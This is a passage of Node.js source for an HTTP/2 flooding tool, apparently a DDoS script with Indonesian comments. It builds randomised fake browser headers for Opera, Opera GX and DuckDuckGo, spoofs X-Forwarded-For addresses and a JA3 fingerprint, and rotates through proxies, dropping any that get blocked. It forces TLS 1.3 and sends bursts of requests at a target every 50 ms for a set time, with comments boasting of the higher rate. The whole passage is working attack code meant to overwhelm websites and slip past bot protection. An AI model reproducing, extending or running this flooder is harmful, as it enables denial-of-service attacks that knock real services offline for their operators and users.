            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(79 + Math.random() * 5)}.0.0.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.google.com/", "https://www.opera.com/gx", "https://www.reddit.com/", "https://www.youtube.com/", "https://www.instagram.com/", "https://www.facebook.com/", "https://twitter.com/", "https://www.github.com/"][Math.floor(Math.random() * 8)],
            "origin": ["https://www.opera.com", "https://www.reddit.com", "https://twitter.com", "https://www.google.com"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        operagx: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera GX";v="${Math.floor(79 + Math.random() * 5)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(79 + Math.random() * 5)}.0.0.0 GX/${Math.floor(79 + Math.random() * 5)}.0.0.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.google.com/", "https://www.opera.com/gx", "https://www.reddit.com/", "https://www.youtube.com/", "https://www.instagram.com/", "https://www.facebook.com/", "https://twitter.com/", "https://www.github.com/"][Math.floor(Math.random() * 8)],
            "origin": ["https://www.opera.com/gx", "https://www.reddit.com", "https://twitter.com", "https://www.google.com"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        duckduckgo: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(100 + Math.random() * 5)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(100 + Math.random() * 5)}.0.0.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://duckduckgo.com/", "https://www.google.com/", "https://www.bing.com/", "https://www.reddit.com/", "https://www.twitter.com/", "https://www.facebook.com/", "https://www.github.com/", "https://www.quora.com/", "https://www.medium.com/"][Math.floor(Math.random() * 9)],
            "origin": ["https://duckduckgo.com", "https://www.google.com", "https://www.bing.com"][Math.floor(Math.random() * 3)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        }
    };
    return headersMap[browser];
}

// Variabel untuk rotasi proxy jika blokir
let blockedProxies = new Set();
let currentProxyIndex = 0;

function getNextProxy() {
    if (proxies.length === 0) return null;
    let attempts = 0;
    while (attempts < proxies.length) {
        const proxy = proxies[currentProxyIndex % proxies.length];
        currentProxyIndex++;
        if (!blockedProxies.has(proxy)) {
            return proxy;
        }
        attempts++;
    }
    // Jika semua proxy diblokir, reset blocked set
    blockedProxies.clear();
    return proxies[0];
}

function runFlooder() {
    const proxyAddr = getNextProxy();
    if (!proxyAddr) return setTimeout(runFlooder, 100);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    const browser = getRandomBrowser();
    const headers = generateHeaders(browser);

    function getWeightedRandom() {
        return Math.random() * Math.random() < 0.25;
    }

    const randomString = randstr(10);
    const headers4 = {
        ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
        ...(Math.random() < 0.75 ? { "referer": "https:/" + clength } : {}),
        ...(Math.random() < 0.75 ? { "origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4, 4) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + clength } : {}),
    };

    let allHeaders = Object.assign({}, headers, headers4);
    const dyn = {
        ...(Math.random() < 0.5 ? { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
        ...(Math.random() < 0.5 ? { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
    };
    const dyn2 = {
        ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
        ...(Math.random() < 0.5 ? { "purpose": "prefetch" } : {}),
        "RTT": "1"
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            blockedProxies.add(proxyAddr);
            return;
        }
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        // ========== PERUBAHAN: FORCE TLS 1.3 ==========
        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureProtocol: 'TLS_method',   // <-- gunakan string, bukan array
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            minVersion: 'TLSv1.3',          // <-- hanya TLS 1.3
            maxVersion: 'TLSv1.3'
        };

        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);

        function generateJA3Fingerprint(socket) {
            const cipherInfo = socket.getCipher();
            const supportedVersions = socket.getProtocol();
            if (!cipherInfo) return null;
            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
            return crypto.createHash('md5').update(ja3String).digest('hex');
        }
        tlsSocket.on('connect', () => {
            const ja3 = generateJA3Fingerprint(tlsSocket);
        });

        let hpack = new HPACK();
        const client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: getSettingsBasedOnISP(isp),
            socket: tlsSocket,
        });
        client.setMaxListeners(0);

        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });

        client.on('connect', () => {
            client.ping((err, duration, payload) => {});
            client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
        });

        // OPTIMASI: interval lebih cepat (50ms) dan kirim lebih banyak request per interval
        const intervalMs = 50; // dari 500 menjadi 50
        const requestsPerInterval = Math.max(1, Math.floor(args.Rate / (1000 / intervalMs)));

        const intervalId = setInterval(() => {
            async function sendRequests() {
                const shuffleObject = (obj) => {
                    const keys = Object.keys(obj);
                    for (let i = keys.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [keys[i], keys[j]] = [keys[j], keys[i]];
                    }
                    const shuffledObj = {};
                    keys.forEach(key => shuffledObj[key] = obj[key]);
                    return shuffledObj;
                };
                const allHeadersFinal = Object.assign({}, headers, headers4);
                const dynHeaders = shuffleObject({
                    ...dyn,
                    ...allHeadersFinal,
                    ...dyn2,
                    ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(dynHeaders)
                ]);

                const requests = [];
                let count = 0;
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    for (let i = 0; i < requestsPerInterval; i++) {
                        const requestPromise = new Promise((resolve, reject) => {
                            // ========== PERUBAHAN: HAPUS weight/depends_on/exclusive ==========
                            const req = client.request(dynHeaders, {})
                            .on('response', response => {
                                const status = response[':status'];
                                if (status === 403 || status === 429) {
                                    blockedProxies.add(proxyAddr);
                                    clearInterval(intervalId);
                                    client.destroy();
                                    tlsSocket.destroy();
                                    connection.destroy();
                                    reject(new Error('Blocked'));
                                } else {
                                    req.close(http2.constants.NO_ERROR);
                                    req.destroy();
                                    resolve();
                                }
                            });
                            req.on('end', () => {
                                count++;
                                if (count === args.time * args.Rate) {
                                    clearInterval(intervalId);
                                    client.close(http2.constants.NGHTTP2_CANCEL);
                                }
                                // Tidak perlu reject, kita biarkan resolve
                            });
                            req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                        });
                        requests.push(requestPromise);
                    }
                    await Promise.all(requests).catch(() => {});
                }
            }
            sendRequests().catch(() => {});
        }, intervalMs);

        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
        });
        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(0), args.time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
